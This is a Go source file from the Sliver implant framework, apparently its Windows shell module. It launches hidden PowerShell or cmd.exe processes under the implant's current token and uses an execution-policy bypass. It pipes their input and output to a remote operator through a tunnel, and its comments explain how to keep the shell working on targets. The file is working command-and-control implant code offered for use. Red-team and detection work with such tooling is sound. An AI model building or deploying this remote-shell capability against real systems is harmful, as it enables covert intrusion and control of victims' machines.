package shell

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"context"
	"strings"

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"golang.org/x/sys/windows"
	"os/exec"
	"syscall"
)

var (
	// Shell constants
	commandPrompt = []string{"C:\\Windows\\System32\\cmd.exe"}
	// powerShell is the preferred interactive shell. Each flag earns its place
	// on an older Windows:
	//
	//   -NoLogo  suppresses the banner, which some builds write slowly enough
	//            that the terminal looks dead for seconds.
	//   -NoExit  keeps the shell alive after -Command finishes. Without it the
	//            command runs and PowerShell exits, so the terminal closes as
	//            soon as it opens.
	//   Bypass   avoids a policy prompt that a piped, console-less process
	//            cannot answer -- it would simply block forever.
	//   try/catch
	//            [Console]::OutputEncoding is a property setter, and in some
	//            older PowerShell builds it throws when the console handle is a
	//            pipe. An uncaught exception inside -Command is a plausible way
	//            for an older host to end up not interactive at all, and
	//            swallowing it costs nothing: the output encoding stays at the
	//            default, so only the glyphs suffer.
	//
	// The try/catch is defensive, not diagnosed. It was added after a Windows 8
	// target produced no terminal output while Windows 10 worked, and the flag
	// set was the only difference between this and the cmd.exe that was never
	// tried.
	powerShell = []string{
		"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"-NoLogo",
		"-NoExit",
		"-ExecutionPolicy", "Bypass",
		"-Command",
		"try { [Console]::OutputEncoding = [Text.UTF8Encoding]::UTF8 } catch { }; " +
			"try { $OutputEncoding = [Text.UTF8Encoding]::UTF8 } catch { }",
	}
)

// GetSystemShellPath - Find powershell or cmd
func GetSystemShellPath(path string) []string {
	if exists(path) {
		return []string{path}
	}
	if exists(powerShell[0]) {
		return powerShell
	}
	return commandPrompt
}

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(priv.CurrentToken),
		HideWindow: true,
	}
	return cmd.Start()
}

// StartInteractive - Start a shell
//
// The requested shell is tried first, then cmd.exe. Nothing else on this path
// can report a failure to the operator: a spawn either yields a process or an
// error, and a shell that starts but never becomes interactive produces
// neither. The cheapest way to stop that becoming a blank terminal is to not
// depend on one binary.
//
// This is a fallback, not a diagnosis. It does not know why the first shell
// produced no prompt and does not need to: the operator gets a working shell, or
// an error from the last attempt instead of silence.
func StartInteractive(tunnelID uint64, command []string, _ bool, _, _ uint16) (*Shell, error) {
	candidates := make([][]string, 0, 2)
	candidates = append(candidates, command)
	if len(command) > 0 && !strings.EqualFold(command[0], commandPrompt[0]) {
		candidates = append(candidates, commandPrompt)
	}

	var lastErr error
	for _, c := range candidates {
		sh, err := pipedShell(tunnelID, c)
		if err == nil {
			return sh, nil
		}
		lastErr = err
		if sh != nil {
			sh.Stop()
		}
	}
	return nil, lastErr
}

func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
	// {{if .Config.Debug}}
	log.Printf("[shell] %s", command)
	// {{end}}

	ctx, cancel := context.WithCancel(context.Background())

	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(priv.CurrentToken),
		HideWindow: true,
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stdin pipe failed\n")
		// {{end}}
		cancel()
		return nil, err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stdout pipe failed\n")
		// {{end}}
		cancel()
		return nil, err
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] stderr pipe failed\n")
		// {{end}}
		cancel()
		return nil, err
	}

	err = cmd.Start()
	if err != nil {
		// Release the context and pipes. Returning a Shell alongside the error
		// left the caller holding a half-built object with no process behind it,
		// and the previous caller discarded the error entirely.
		cancel()
		return nil, err
	}

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  stdout,
		Stdin:   stdin,
		Stderr:  stderr,
		Cancel:  cancel,
	}, nil
}
